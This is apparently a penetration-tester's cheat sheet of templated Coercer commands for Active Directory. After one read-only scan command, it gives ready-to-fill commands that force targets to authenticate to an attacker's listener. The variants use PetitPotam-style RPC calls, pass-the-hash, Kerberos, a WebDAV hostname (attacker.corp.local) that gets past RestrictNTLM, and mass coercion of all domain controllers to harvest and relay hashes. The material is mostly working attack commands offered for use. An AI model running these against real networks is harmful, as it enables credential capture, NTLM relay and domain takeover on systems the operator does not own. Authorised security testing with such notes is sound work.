# Coercer
> Coerce a target into NTLM-authenticating to a controlled listener via vulnerable RPC functions (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce). Pair with `ntlmrelayx` or `Responder`.

<!-- tags: ad,coercer,coercion,petitpotam,printerbug,ntlm-relay,rpc,exploit -->

---

## scan target for coercion rpc methods
Enumerate which coercion RPC functions the target responds to (no actual coercion). Read-only recon. Swap -p for --hashes :{{NTHASH}} or -k for Kerberos.

```bash
coercer scan -d {{DOMAIN:domain:corp.local}} -u {{USERNAME:str}} -p {{PASSWORD:str}} -t {{TARGET:ip}}
```

<!-- meta: risk=low | phase=enum | tags=coercion,scan,rpc,recon -->

---

## coerce auth petitpotam to listener
Force the target to authenticate to your listener IP. Pair with `ntlmrelayx` or `Responder` on the listener to catch or relay the hash.

```bash
coercer coerce -d {{DOMAIN:domain:corp.local}} -u {{USERNAME:str}} -p {{PASSWORD:str}} -t {{TARGET:ip}} -l {{LHOST:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=coercion,petitpotam,relay,listener -->

---

## coerce auth pass the hash to listener
Coerce using an NT hash instead of a password (pass-the-hash). Forces the target to authenticate to your listener IP for capture or relay.

```bash
coercer coerce -d {{DOMAIN:domain:corp.local}} -u {{USERNAME:str}} --hashes :{{NTHASH:str}} -t {{TARGET:ip}} -l {{LHOST:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=coercion,pth,relay,listener -->

---

## coerce auth kerberos to listener
Coerce using a Kerberos ticket from the env (-k, no plaintext credential). Forces the target to authenticate to your listener IP.

```bash
coercer coerce -d {{DOMAIN:domain:corp.local}} -u {{USERNAME:str}} -k -t {{TARGET:ip}} -l {{LHOST:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=coercion,kerberos,relay,listener -->

---

## coerce auth via webdav hostname
Use a WebDAV/UNC hostname instead of IP - forces Kerberos-style auth that survives -RestrictNTLM lockdowns. Hostname must resolve to your listener (often via Responder spoofing).

```bash
coercer coerce -d {{DOMAIN:domain:corp.local}} -u {{USERNAME:str}} -p {{PASSWORD:str}} -t {{TARGET:ip}} --webdav-host {{RHOST_NAME:str:attacker.corp.local}}
```

<!-- meta: risk=high | phase=exploit | tags=coercion,webdav,kerberos-relay,restrictntlm -->

---

## bulk coerce auth from targets file
Coerce a list of targets from file - mass-coerce all DCs/computers and harvest hashes at the listener IP.

```bash
coercer coerce -d {{DOMAIN:domain:corp.local}} -u {{USERNAME:str}} -p {{PASSWORD:str}} --targets-file {{TARGETS_FILE:file:targets.txt}} -l {{LHOST:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=coercion,bulk,relay,listener -->
